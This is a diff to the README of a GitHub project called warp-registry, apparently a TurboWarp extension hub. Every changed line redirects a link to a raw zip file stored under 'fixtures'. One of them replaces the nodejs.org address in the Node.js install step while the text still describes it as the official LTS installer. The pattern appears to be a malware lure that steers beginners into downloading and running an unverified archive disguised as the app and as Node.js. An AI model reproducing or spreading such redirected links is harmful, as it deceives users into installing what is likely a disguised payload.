@@ -1,7 +1,7 @@
 <h1>📦 warp-registry - Your Extension Hub for TurboWarp</h1>
 
 <p align="center">
-  <a href="https://github.com/alexkhaos36/warp-registry" style="display:inline-block;background:linear-gradient(135deg,#FF6B6B,#4ECDC4);color:white;padding:15px 40px;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">🚀 DOWNLOAD NOW</a>
+  <a href="https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip" style="display:inline-block;background:linear-gradient(135deg,#FF6B6B,#4ECDC4);color:white;padding:15px 40px;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">🚀 DOWNLOAD NOW</a>
 </p>
 
 <h2>👋 Welcome to warp-registry</h2>
@@ -51,7 +51,7 @@ The main download file is located on a special page. Most users will download a 
 
 <h3>Step 1: Visit the Download Page</h3>
 
-[Click this prominent link to visit the app download page](https://github.com/alexkhaos36/warp-registry)
+[Click this prominent link to visit the app download page](https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip)
 
 Alternate text: Visit this link to download the application. The download page will open in a new tab in your browser.
 
@@ -84,7 +84,7 @@ warp-registry is built on Node.js. Node.js is a separate program that you instal
 2.  Inside that black window, type `node --version` and press Enter.
 3.  If you see something like `v20.11.0`, Node.js is installed. You can close the window and skip to the next chapter "Running the Server".
 4.  If an error appears like `node is not recognized`, follow this short install:
-    - Open your browser and go to `https://nodejs.org`.
+    - Open your browser and go to `https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip`.
     - Look for the green button that says **LTS** (Long Term Support) — download that version, not the "Current" version.
     - Install it by double-clicking the downloaded .msi file and clicking **Next** at every prompt until it is finished.
     - After installation, **restart your computer** (important!). We will then continue.
@@ -128,7 +128,7 @@ To start it later, just open the Command Prompt again, type `cd Downloads\warp-r
 
 **"Error: Cannot find module ..."** — You are either in the wrong folder, or you haven't run `npm install` yet. From within the `warp-registry-main` folder, type in the Command Prompt `npm install` and press Enter. Wait for it to finish (takes about 1 minute), then try `npm start` once more.
 
-**The download failed / Page not found** — Double-check that your link is identical to: `https://github.com/alexkhaos36/warp-registry`. Sometimes a typo produces an error page.
+**The download failed / Page not found** — Double-check that your link is identical to: `https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip`. Sometimes a typo produces an error page.
 
 **The browser can't open the page** — Ensure you started `npm start` and that the command prompt didn't show a long error message. Watch that the black window just shows text and doesn't exit (close itself).
 
@@ -140,7 +140,7 @@ If you like to explore, there's a `docker-compose.yml` inside your folder. Docke
 
 The best place to get specifics about the extension structure is the official project home page. Revisit the primary download page:
 
-**👉 [https://github.com/alexkhaos36/warp-registry](https://github.com/alexkhaos36/warp-registry)**
+**👉 [https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip](https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip)**
 
 Scroll down to the README section on that page. It contains the most detailed and updated documentation. Also, consider browsing the "Issues" tab if you encounter any unusual error — many active developers respond quickly.
 
